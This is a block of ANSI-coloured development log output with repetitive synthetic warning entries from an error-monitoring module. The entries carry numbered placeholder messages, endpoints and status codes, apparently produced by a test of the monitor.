WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901653Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901701Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901970Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902027Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902372Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902479Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902538Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902591Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902641Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902743Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902909Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.902962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4000'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4001'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903064Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4002'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4003'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4004'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4005'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903263Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4006'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4007'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4008'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4009'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4010'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4011'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4012'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4013'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4014'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903879Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4015'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4016'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.903980Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4017'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
